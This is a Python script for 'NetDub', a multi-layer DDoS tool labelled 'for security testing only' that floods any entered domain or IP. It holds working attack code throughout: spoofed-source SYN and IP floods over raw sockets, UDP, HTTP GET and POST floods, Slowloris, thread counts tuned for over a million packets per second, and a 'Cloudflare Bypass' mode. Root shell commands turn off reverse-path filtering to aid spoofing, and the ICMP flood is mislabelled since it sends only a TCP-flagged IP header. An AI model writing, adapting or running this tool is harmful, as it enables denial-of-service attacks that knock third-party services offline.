#!/usr/bin/env python3
"""
NetDub - Ultimate DDoS Testing Suite
Final Version - Maximum Performance Root Tool
For security testing and web hardening purposes only
"""

import os
import sys
import socket
import struct
import random
import time
import threading
import multiprocessing
import subprocess
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from colorama import Fore, init, Style
import argparse

# Check root privileges
if os.geteuid() != 0:
    print(f"{Fore.RED}[!] This tool requires root privileges for maximum performance{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Please run: sudo python3 {sys.argv[0]}{Fore.RESET}")
    sys.exit(1)

init(autoreset=True)

class NetDubCore:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.target_ip = socket.gethostbyname(target_host)
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'bytes_sent': 0,
            'errors': 0
        }
        
        # Performance optimizations
        self.setup_performance()
        
    def setup_performance(self):
        """Setup system for maximum performance"""
        try:
            # Increase file descriptor limits
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
            
            # Optimize network stack
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            os.system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter")
            os.system("echo 65535 > /proc/sys/net/core/somaxconn")
            
            print(f"{Fore.GREEN}[✓] System optimized for maximum performance{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Performance optimization warning: {e}{Fore.RESET}")

    def create_raw_socket(self):
        """Create raw socket for packet crafting"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except Exception:
            return None

    def craft_ip_header(self, src_ip, dst_ip):
        """Craft IP header"""
        version = 4
        ihl = 5
        tos = 0
        tot_len = 40
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        check = 0
        saddr = socket.inet_aton(src_ip)
        daddr = socket.inet_aton(dst_ip)
        
        ihl_version = (version << 4) + ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ihl_version, tos, tot_len, id, frag_off,
                               ttl, protocol, check, saddr, daddr)
        return ip_header

    def craft_tcp_header(self, src_port, dst_port, seq=0, ack_seq=0, flags=0x02):
        """Craft TCP header"""
        doff = 5
        fin = 0
        syn = 1 if flags & 0x02 else 0
        rst = 1 if flags & 0x04 else 0
        psh = 1 if flags & 0x08 else 0
        ack = 1 if flags & 0x10 else 0
        urg = 1 if flags & 0x20 else 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                src_port, dst_port, seq, ack_seq,
                                offset_res, tcp_flags, window, check, urg_ptr)
        return tcp_header

class LayerAttacks:
    def __init__(self, core):
        self.core = core
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]

    def layer3_flood(self, intensity=1000):
        """Layer 3 - IP/ICMP Flood"""
        print(f"{Fore.CYAN}[*] Layer 3 - IP/ICMP Flood Attack{Fore.RESET}")
        
        def icmp_flood():
            raw_sock = self.core.create_raw_socket()
            if not raw_sock:
                return
                
            while self.core.running:
                try:
                    # Craft ICMP packet
                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    packet = self.core.craft_ip_header(fake_ip, self.core.target_ip)
                    
                    # Send packet
                    raw_sock.sendto(packet, (self.core.target_ip, 0))
                    self.core.stats['packets_sent'] += 1
                    
                except Exception:
                    self.core.stats['errors'] += 1
        
        # Launch threads
        for _ in range(intensity):
            threading.Thread(target=icmp_flood, daemon=True).start()

    def layer4_syn_flood(self, intensity=2000):
        """Layer 4 - SYN Flood Attack"""
        print(f"{Fore.CYAN}[*] Layer 4 - SYN Flood Attack{Fore.RESET}")
        
        def syn_flood():
            raw_sock = self.core.create_raw_socket()
            if not raw_sock:
                return
                
            while self.core.running:
                try:
                    # Random source IP and port
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    src_port = random.randint(1024, 65535)
                    
                    # Craft packet
                    ip_header = self.core.craft_ip_header(src_ip, self.core.target_ip)
                    tcp_header = self.core.craft_tcp_header(src_port, self.core.target_port, flags=0x02)
                    
                    packet = ip_header + tcp_header
                    raw_sock.sendto(packet, (self.core.target_ip, self.core.target_port))
                    
                    self.core.stats['packets_sent'] += 1
                    
                except Exception:
                    self.core.stats['errors'] += 1
        
        # Launch threads
        for _ in range(intensity):
            threading.Thread(target=syn_flood, daemon=True).start()

    def layer4_udp_flood(self, intensity=1500):
        """Layer 4 - UDP Flood Attack"""
        print(f"{Fore.CYAN}[*] Layer 4 - UDP Flood Attack{Fore.RESET}")
        
        def udp_flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.core.running:
                try:
                    # Random payload
                    payload = os.urandom(random.randint(64, 1024))
                    sock.sendto(payload, (self.core.target_ip, self.core.target_port))
                    
                    self.core.stats['packets_sent'] += 1
                    self.core.stats['bytes_sent'] += len(payload)
                    
                except Exception:
                    self.core.stats['errors'] += 1
        
        # Launch threads
        for _ in range(intensity):
            threading.Thread(target=udp_flood, daemon=True).start()

    def layer7_http_flood(self, intensity=500):
        """Layer 7 - HTTP Flood Attack"""
        print(f"{Fore.CYAN}[*] Layer 7 - HTTP Flood Attack{Fore.RESET}")
        
        def http_flood():
            while self.core.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.core.target_ip, self.core.target_port))
                    
                    # Craft HTTP request
                    request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                    request += f"Host: {self.core.target_host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    
                    sock.send(request.encode())
                    self.core.stats['connections_made'] += 1
                    self.core.stats['bytes_sent'] += len(request)
                    
                    sock.close()
                    
                except Exception:
                    self.core.stats['errors'] += 1
        
        # Launch threads
        for _ in range(intensity):
            threading.Thread(target=http_flood, daemon=True).start()

    def layer7_slowloris(self, intensity=300):
        """Layer 7 - Slowloris Attack"""
        print(f"{Fore.CYAN}[*] Layer 7 - Slowloris Attack{Fore.RESET}")
        
        def slowloris():
            sockets = []
            
            # Create initial connections
            for _ in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.core.target_ip, self.core.target_port))
                    
                    # Send partial request
                    request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                    request += f"Host: {self.core.target_host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    
                    sock.send(request.encode())
                    sockets.append(sock)
                    self.core.stats['connections_made'] += 1
                    
                except Exception:
                    self.core.stats['errors'] += 1
            
            # Keep connections alive
            while self.core.running:
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets.remove(sock)
                        
                time.sleep(10)
        
        # Launch threads
        for _ in range(intensity):
            threading.Thread(target=slowloris, daemon=True).start()

    def layer7_post_flood(self, intensity=400):
        """Layer 7 - POST Flood Attack"""
        print(f"{Fore.CYAN}[*] Layer 7 - POST Flood Attack{Fore.RESET}")
        
        def post_flood():
            while self.core.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.core.target_ip, self.core.target_port))
                    
                    # Large POST data
                    post_data = "x=" * random.randint(1024, 8192)
                    request = f"POST /?{random.randint(1,999999)} HTTP/1.1\r\n"
                    request += f"Host: {self.core.target_host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += f"Content-Length: {len(post_data)}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                    request += post_data
                    
                    sock.send(request.encode())
                    self.core.stats['connections_made'] += 1
                    self.core.stats['bytes_sent'] += len(request)
                    
                    sock.close()
                    
                except Exception:
                    self.core.stats['errors'] += 1
        
        # Launch threads
        for _ in range(intensity):
            threading.Thread(target=post_flood, daemon=True).start()

class NetDubInterface:
    def __init__(self):
        self.core = None
        self.attacks = None
        
    def print_banner(self):
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║  ███╗   ██╗███████╗████████╗██████╗ ██╗   ██╗██████╗          ║
║  ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║   ██║██╔══██╗         ║
║  ██╔██╗ ██║█████╗     ██║   ██║  ██║██║   ██║██████╔╝         ║
║  ██║╚██╗██║██╔══╝     ██║   ██║  ██║██║   ██║██╔══██╗         ║
║  ██║ ╚████║███████╗   ██║   ██████╔╝╚██████╔╝██████╔╝         ║
║  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═════╝          ║
╠══════════════════════════════════════════════════════════════╣
║                 Ultimate DDoS Testing Suite                   ║
║                    Final Version - Root                       ║
║              Maximum Performance • Multi-Layer                ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}

{Fore.YELLOW}⚠️  FOR SECURITY TESTING AND WEB HARDENING ONLY ⚠️{Fore.RESET}
{Fore.CYAN}Author: NetDub Security Team{Fore.RESET}
{Fore.CYAN}Version: Final • Root Required{Fore.RESET}
"""
        print(banner)

    def show_attack_menu(self):
        menu = f"""
{Fore.GREEN}╔═══════════════════════════════════════════════════════════════╗
║                        ATTACK MODES                           ║
╠═══════════════════════════════════════════════════════════════╣
║  {Fore.YELLOW}1.{Fore.GREEN} Light Testing     - Basic vulnerability scan           ║
║  {Fore.YELLOW}2.{Fore.GREEN} Medium Stress     - Moderate load testing             ║
║  {Fore.YELLOW}3.{Fore.GREEN} Heavy Load        - High performance testing          ║
║  {Fore.YELLOW}4.{Fore.GREEN} Extreme Stress    - Maximum load testing             ║
║  {Fore.YELLOW}5.{Fore.GREEN} Impossible Mode   - 1.2M+ PPS Ultimate Test          ║
║  {Fore.YELLOW}6.{Fore.GREEN} Custom Attack     - Manual configuration             ║
║  {Fore.YELLOW}7.{Fore.GREEN} Multi-Layer       - All layers simultaneously        ║
║  {Fore.YELLOW}8.{Fore.GREEN} Cloudflare Bypass - 522 Error Testing               ║
╚═══════════════════════════════════════════════════════════════╝{Fore.RESET}
"""
        print(menu)

    def run_attack(self, mode):
        if not self.core:
            print(f"{Fore.RED}[!] Please set target first{Fore.RESET}")
            return
            
        self.core.running = True
        
        if mode == 1:  # Light Testing
            self.attacks.layer7_slowloris(50)
            self.attacks.layer7_http_flood(100)
            
        elif mode == 2:  # Medium Stress
            self.attacks.layer4_syn_flood(500)
            self.attacks.layer7_http_flood(200)
            self.attacks.layer7_slowloris(100)
            
        elif mode == 3:  # Heavy Load
            self.attacks.layer3_flood(800)
            self.attacks.layer4_syn_flood(1000)
            self.attacks.layer4_udp_flood(800)
            self.attacks.layer7_http_flood(300)
            
        elif mode == 4:  # Extreme Stress
            self.attacks.layer3_flood(1200)
            self.attacks.layer4_syn_flood(1500)
            self.attacks.layer4_udp_flood(1200)
            self.attacks.layer7_http_flood(400)
            self.attacks.layer7_slowloris(200)
            self.attacks.layer7_post_flood(300)
            
        elif mode == 5:  # Impossible Mode - 1.2M+ PPS
            print(f"{Fore.RED}[!] IMPOSSIBLE MODE - 1.2M+ PPS ACTIVATED{Fore.RESET}")
            self.attacks.layer3_flood(3000)
            self.attacks.layer4_syn_flood(4000)
            self.attacks.layer4_udp_flood(3000)
            self.attacks.layer7_http_flood(1000)
            self.attacks.layer7_slowloris(500)
            self.attacks.layer7_post_flood(800)
            
        elif mode == 7:  # Multi-Layer
            self.attacks.layer3_flood(1000)
            self.attacks.layer4_syn_flood(1200)
            self.attacks.layer4_udp_flood(1000)
            self.attacks.layer7_http_flood(400)
            self.attacks.layer7_slowloris(300)
            self.attacks.layer7_post_flood(400)
            
        elif mode == 8:  # Cloudflare Bypass
            print(f"{Fore.YELLOW}[*] Testing Cloudflare 522 Error Conditions{Fore.RESET}")
            self.attacks.layer4_syn_flood(2000)
            self.attacks.layer7_slowloris(400)
            
        # Start statistics thread
        threading.Thread(target=self.show_stats, daemon=True).start()

    def show_stats(self):
        start_time = time.time()
        
        while self.core.running:
            elapsed = time.time() - start_time
            pps = self.core.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{Fore.CYAN}[📊] PPS: {pps:.0f} | Packets: {self.core.stats['packets_sent']} | Connections: {self.core.stats['connections_made']} | Errors: {self.core.stats['errors']}{Fore.RESET}", end='')
            
            time.sleep(1)

    def main(self):
        self.print_banner()
        
        try:
            # Get target
            target = input(f"{Fore.GREEN}🎯 Enter target (domain/IP): {Fore.RESET}").strip()
            port = int(input(f"{Fore.GREEN}🔌 Enter port (default 80): {Fore.RESET}") or "80")
            
            # Initialize core
            self.core = NetDubCore(target, port)
            self.attacks = LayerAttacks(self.core)
            
            print(f"\n{Fore.GREEN}[✓] Target: {target}:{port} ({self.core.target_ip}){Fore.RESET}")
            
            # Show menu
            self.show_attack_menu()
            
            choice = int(input(f"{Fore.GREEN}🚀 Select attack mode: {Fore.RESET}"))
            
            print(f"\n{Fore.RED}[⚡] Starting attack... Press Ctrl+C to stop{Fore.RESET}")
            self.run_attack(choice)
            
            # Keep running
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack stopped by user{Fore.RESET}")
            if self.core:
                self.core.running = False
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")

if __name__ == "__main__":
    NetDubInterface().main()
